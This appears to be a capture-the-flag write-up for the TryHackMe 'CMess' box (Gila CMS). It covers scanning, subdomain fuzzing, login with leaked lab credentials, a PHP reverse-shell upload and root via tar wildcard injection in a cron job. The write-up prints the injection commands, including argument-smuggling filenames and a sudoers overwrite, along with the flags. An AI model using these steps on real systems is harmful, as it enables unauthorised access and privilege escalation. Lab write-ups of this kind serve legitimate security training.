> CMess | Gila CMS

**export IP=10.10.9.193**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

# robots.txt

```
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

# Gobuster

sudo gobuster -u http://cmess.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 20 -x php,txt,sql,bak -o gobuster/initial

```
/About (Status: 200)
/Index (Status: 200)
/Search (Status: 200)
/about (Status: 200)
/admin (Status: 200) => We have a login
/api (Status: 200)
/assets (Status: 301)
/author (Status: 200)
/blog (Status: 200)
/category (Status: 200)
/feed (Status: 200)
/fm (Status: 200)
/index (Status: 200)
```

## Note: The box says we can't bruteforce and add the IP to our host file. 

Let's fuzz for subdomains as sugessted by the hint. Here let's use Burp's turbo intruder to fuzz capture a request and send it to turbo intruder. Now choosing wordlist `/usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt`. Ooh! we got one

```
dev.cmess.thm
```

And now we can go to that site and wow we have some juicy stuff here.

1. Misconfigured .htaccess file
2. Credentails => `andre`:`KPFTN_f2yxe%` (andre@cmess.thm)

And yep we can login as Andre using the creds. And we found the version of CMS `Gila CMS version 1.10.9`.

We have upload so let's upload a php reverse shell!

We uploaded it and found it at assets so accessing it at `http://cmess.thm/assets/hp-reverse-shell.php`. And we are in!

Running linpeas we have `-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak`. We UQfsdCB7aAP6have andre's backup password `UQfsdCB7aAP6`. su andre.

# user.txt

```
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```

We find a cronjob `*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *` and it runs with wild characters .Surfing google we have an exploit.

```
echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
sudo bash
```

And we are root!! 

# root.txt

```
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```